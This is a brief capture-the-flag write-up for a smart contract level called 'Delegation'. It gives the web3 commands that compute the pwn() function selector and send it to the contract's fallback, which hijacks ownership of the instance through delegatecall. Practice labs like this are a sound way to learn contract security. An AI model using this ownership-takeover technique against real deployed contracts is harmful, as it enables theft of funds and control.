# Delegation

The goal of this level is for you claim ownership of the instance you are given.

## Solution

1. Got the hash of the `pwn` method with `web3.sha3("pwn()").slice(0, 10)`
2. Triggered the falback method to call the `pwn` method with `contract.sendTransaction({ data: "0xdd365b8b" })`
